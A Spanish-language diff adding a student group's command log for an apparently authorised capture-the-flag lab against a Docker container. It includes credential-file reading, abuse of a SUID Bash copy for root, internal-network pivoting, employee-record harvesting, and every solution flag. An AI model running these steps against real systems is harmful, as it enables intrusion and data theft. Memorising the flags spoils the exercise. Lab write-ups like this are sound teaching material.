@@ -1,0 +1,132 @@
+# Comandos ejecutados y contexto — Lab 08
+# Entorno: Lab 08 autorizado de CyberLab; host víctima `phantomcorp` (make shell-victima
+# / `docker exec -u operador`), salvo que se indique otro punto de vista.
+
+# --- P1 — R1: reconocimiento del host comprometido ---
+# Fecha de ejecución: 2026-10-23
+# Ejecutado desde el host anfitrión para entrar como `operador` al contenedor víctima:
+docker exec -u operador cyberlab-phantomcorp bash -lc "id; hostname; hostname -I; echo '--- /opt ---'; ls -la /opt; echo '--- /opt/phantom-deploy ---'; ls -la /opt/phantom-deploy; echo '--- DEPLOY_NOTES.txt ---'; cat /opt/phantom-deploy/DEPLOY_NOTES.txt"
+
+# Presentación de la flag, ejecutada desde la raíz del repositorio:
+./ctf submit 08 R1 'FLAG{...}'
+
+# --- P2 — comandos ejecutados y contexto ---
+# Fecha de ejecución: 2026-10-23
+
+# 1. Confirmación de identidad, ubicación de la configuración y lectura de R2.
+# Ejecutado desde el host anfitrión para entrar como `operador` al contenedor víctima:
+docker exec -u operador cyberlab-phantomcorp bash -lc "id; hostname; echo '--- /var/www ---'; ls -la /var/www; echo '--- .env ---'; cat /var/www/.env 2>&1"
+
+# 2. Evidencia de apoyo para la respuesta P2 sobre pivoting.
+# Ejecutado desde el host anfitrión para entrar como `operador` al contenedor víctima:
+docker exec -u operador cyberlab-phantomcorp bash -lc "id; hostname; echo '--- consulta al host interno ---'; curl -sS http://phantomcorp-db/ 2>&1"
+
+# --- P3 — R3: escalada de privilegios mediante SUID ---
+# Fecha de ejecución: 2026-10-23
+
+# Comandos ejecutados dentro del contenedor víctima,
+# como usuario operador (docker exec -u operador -it cyberlab-phantomcorp bash).
+
+# 1. Comprobar la identidad inicial.
+id | tee /tmp/r3-identidad.txt
+
+# 2. Enumerar los archivos con permiso SUID.
+find / -type f -perm -4000 2>/dev/null | tee /tmp/r3-suid-enumeracion.txt
+
+# 3. Examinar el binario no estándar encontrado.
+ls -l /usr/local/bin/system-check
+
+# 4. Comprobar que system-check es una copia de Bash.
+sha256sum /usr/local/bin/system-check /bin/bash
+
+# 5. Comprobar la ejecución con privilegios efectivos de root.
+/usr/local/bin/system-check -p -c 'id' | tee /tmp/r3-privesc-identidad.txt
+
+# 6. Leer exclusivamente el archivo protegido indicado por la consigna.
+/usr/local/bin/system-check -p -c 'cat /root/flag.txt' | tee /tmp/r3-privesc-flag.txt
+
+# Resultado: euid=0(root) y FLAG{privesc_suid_root}
+
+# Comando ejecutado desde Git Bash, en la raíz del repositorio.
+./ctf submit 08 R3 'FLAG{privesc_suid_root}'
+
+# Resultado: [ OK ] Reto R3 resuelto: Escalada de privilegios (SUID)
+
+# --- P5 — R5: automatización de legajos ---
+# Fecha de ejecución: 2026-10-26
+# Entorno autorizado: Lab 08 de PhantomCorp.
+
+# 1. Entrar al host víctima como usuario limitado operador.
+# Ejecutado desde PowerShell.
+docker exec -it -u operador cyberlab-phantomcorp bash
+
+# 2. Confirmar identidad y consultar un legajo de referencia.
+# Ejecutado dentro de la víctima.
+whoami
+hostname
+curl -i "http://phantomcorp-db/empleado?id=1"
+
+# 3. Copiar el recolector al contenedor víctima.
+# Ejecutado desde PowerShell.
+docker cp entregas/lab08/grupo06/src/recolector.py cyberlab-phantomcorp:/tmp/recolector.py
+
+# 4. Ejecutar el programa dentro de la víctima como operador.
+# Ejecutado desde PowerShell mediante docker exec.
+docker exec -u operador cyberlab-phantomcorp python3 /tmp/recolector.py --base http://phantomcorp-db --desde 1 --hasta 250
+
+# Resultado: flag encontrada en el legajo 187.
+# FLAG{automation_pays_off}
+
+# 5. Comprobar el comportamiento sin hallazgos.
+docker exec -u operador cyberlab-phantomcorp python3 /tmp/recolector.py --base http://phantomcorp-db --desde 1 --hasta 5
+
+# 6. Comprobar el manejo de un legajo inexistente.
+docker exec -u operador cyberlab-phantomcorp python3 /tmp/recolector.py --base http://phantomcorp-db --desde 251 --hasta 251
+
+# 7. Validar la flag desde la consola atacante.
+# Se utilizó una copia temporal compatible con Linux.
+docker exec cyberlab-attacker bash /tmp/lab08-ctf/ctf submit 08 R5 'FLAG{automation_pays_off}'
+
+# 8. Consultar el estado del validador temporal.
+docker exec cyberlab-attacker bash /tmp/lab08-ctf/ctf status 08
+
+# El estado temporal mostró R5 resuelto (1/5).
+# No representa el progreso consolidado de los cinco integrantes.
+
+# --- P4 — R4: pivoting hacia la red interna ---
+# Fecha de ejecución: 2026-10-28
+
+# 1. Contexto y observación: identidad, interfaces, resolución y consulta del host interno.
+# Ejecutado desde el host anfitrión para entrar como `operador` al contenedor víctima:
+docker exec -u operador cyberlab-phantomcorp bash -lc "id; hostname; ip addr; echo '--- /etc/hosts ---'; cat /etc/hosts; echo '--- resolucion de phantomcorp-db ---'; getent hosts phantomcorp-db; echo '--- consulta al host interno desde la victima ---'; curl -isS --max-time 10 http://phantomcorp-db/ 2>&1"
+
+# Resultado guardado en evidencia/salidas/r4-pivot-victima.txt:
+# la víctima tiene eth0 172.21.0.3 (labnet) y eth1 172.20.0.3 (internalnet);
+# phantomcorp-db resuelve a 172.20.0.2 y responde HTTP 200 con FLAG{pivot_internal_host}.
+
+# 2. Contraste de posición: la consola atacante externa no alcanza el host interno.
+# Ejecutado desde el host anfitrión, dentro de la consola atacante:
+docker exec cyberlab-attacker bash -c "id; hostname; hostname -I; echo '--- resolucion de phantomcorp-db ---'; getent hosts phantomcorp-db || echo 'getent: phantomcorp-db no resuelve'; echo '--- intento de consulta al host interno desde el atacante ---'; curl -isS --max-time 10 http://phantomcorp-db/ 2>&1 || true; echo '--- contraste: alcance desde el atacante en labnet ---'; getent hosts phantomcorp; curl -sS --max-time 10 -o /dev/null -w 'TCP 80 phantomcorp: %{http_code}\n' --connect-timeout 3 http://phantomcorp/ 2>&1 || true"
+
+# Resultado guardado en evidencia/salidas/r4-pivot-atacante.txt:
+# el atacante solo tiene 172.21.0.2 (labnet), no resuelve phantomcorp-db
+# (curl error 6: Could not resolve host) y sí resuelve a phantomcorp (172.21.0.3, labnet).
+
+# 3. Presentación de la flag y estado, ejecutados desde la raíz del repositorio (Git Bash):
+./ctf submit 08 R4 'FLAG{pivot_internal_host}'
+./ctf status 08
+
+# Resultado: [ OK ] Reto R4 resuelto: Pivoting al host interno.
+
+# --- Consolidación del estado del validador (2026-10-28) ---
+# Se presentaron desde la raíz del repositorio (Git Bash) las cinco flags
+# ya obtenidas y documentadas por el grupo:
+./ctf submit 08 R1 'FLAG{post_situational_awareness}'
+./ctf submit 08 R2 'FLAG{loot_credentials_found}'
+./ctf submit 08 R3 'FLAG{privesc_suid_root}'
+./ctf submit 08 R4 'FLAG{pivot_internal_host}'
+./ctf submit 08 R5 'FLAG{automation_pays_off}'
+./ctf status 08
+
+# Resultado: 5/5 (100%), lab completo.
+# Salida guardada en evidencia/salidas/status-08.txt.
